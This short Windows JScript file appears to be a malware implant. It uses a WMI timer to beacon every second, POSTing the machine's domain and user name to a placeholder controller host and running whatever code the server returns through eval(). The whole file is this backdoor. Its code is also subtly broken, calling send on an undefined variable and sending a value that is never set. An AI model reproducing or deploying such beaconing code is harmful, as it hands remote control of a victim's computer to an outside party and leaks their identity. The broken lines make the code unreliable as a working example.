var identity = new ActiveXObject("WScript.Network");
var clock = GetObject("winmgmts:\\\\.\\root\\cimv2").ExecNotificationQuery("SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_LocalTime'");
var client = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var state = [];
while (true) {
  clock.NextEvent();
  client.open("POST", "https://controller.test", false);
  unrelated.send(identity.UserDomain + '\t' + identity.UserName + '\t' + state[2]);
  state[2] = "";
  state[9] = client.responseText;
  eval(state[9]);
}
